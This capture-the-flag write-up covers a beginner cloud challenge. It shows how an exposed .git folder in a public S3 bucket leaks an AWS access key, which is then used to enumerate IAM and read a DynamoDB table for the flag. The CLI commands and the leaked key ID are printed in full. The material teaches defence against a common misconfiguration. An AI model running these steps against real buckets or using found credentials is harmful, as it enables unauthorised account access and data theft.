# Cumulus

Category: Cloud
Difficulty: Baby
Author: kangwijen

## Description

CloudTech is a new startup that just launched its company landing page to attract investors and showcase its vision. The site is simple and static, hosted entirely on AWS. With a tight deadline, the team rushed the deployment and may have overlooked some security best practices. Your task is to investigate the website and check if there are any misconfigurations or vulnerabilities. 

<a href="https://d16nohi04dvwd6.cloudfront.net">CloudTech Landing Page</a>

## Solution

1. Initial Reconnaissance

    Visit the provided site:

    ```bash
    https://d16nohi04dvwd6.cloudfront.net
    ```
    
    It's a basic static landing page with no visible dynamic behavior.

    But, using browser DevTools, we find requests to `.jpg` files are being redirected to an S3 bucket.

    ![image](src/1.png)

    ![image](src/2.png)

2. Exploring the S3 Bucket

    The redirected bucket URL is publicly accessible. Accessing it reveals folders like `.git`, `.next`, and `out`.

    ![image](src/3.png)

    The `.git` folder is exposed and accessible, which is a major misconfiguration.

3. Dumping the Git Repository

    Use AWS CLI to recursively download the `.git` directory from the bucket:

    ```bash
    aws s3 cp s3://cloudtech-c1fc7cba28dfd8af48612c4107865043/.git/ ./local/ --recursive --no-sign-request
    ```

    This retrieves the full `.git` metadata needed to reconstruct the repository.

4. Checking the Git Repository

    Use `trufflehog` to scan the dumped repo for secrets:

    ```bash
    docker run --rm -v "$(pwd)":/pwd ghcr.io/trufflesecurity/trufflehog:latest git file:///pwd/local
    ```

    The scan reveals a valid AWS access key.

    ![image](src/4.png)

    Use `git log` to inspect the commit containing the secret:

    ```bash
    git log -p -S AKIA453N4QOMLA5KOIUL
    ```

    ![image](src/5.png)

5. Enumerating the AWS Account

    Using the leaked AWS credentials, configure the AWS CLI:

    ```bash
    aws configure
    ```

    Then, run the following commands to enumerate the account:

    ```bash
    aws sts get-caller-identity
    aws iam get-user
    ```

    ![image](src/6.png)

    This confirms the credentials belong to IAM user `cloudtech-dev` under account `888751817624`. Next, list any user-attached policies:

    ```bash
    aws iam list-user-policies --user-name cloudtech-dev
    ```

    ![image](src/7.png)

    We can see the account has the `cloudtech-policy` policy attached. We can inspect the policy by running this command:

    ```bash
    aws iam get-policy --policy-arn arn:aws:iam::aws:policy/cloudtech-policy
    ```

    ![image](src/8.png)

    The policy grants read access to a DynamoDB table named `cloudtech-db`.

6. Exploring the DynamoDB Table

    With read permissions confirmed, check the table contents using:

    ```bash
    aws dynamodb scan --table-name cloudtech-db
    ```

    ![image](src/9.png)

    We can see the table has the `flag` item, and we can just copy the value of the `flag` item.

Flag: `ITSEC{d39c27906533a0d44e052520f3e47790}`

## Further Reading
- [Thinking Like a Hacker: AWS Keys in Private Repos](https://blog.gitguardian.com/thinking-like-a-hacker-aws-keys-in-private-repos/)
- [EMERALDWHALE: 15k Cloud credentials stolen in operation targeting exposed Git config files](https://sysdig.com/blog/emeraldwhale/)
- [Secure Your Repositories: Prevent Credential Leaks with Gitleaks](https://www.trevorlasn.com/blog/your-repo-is-a-leaky-ship-probably)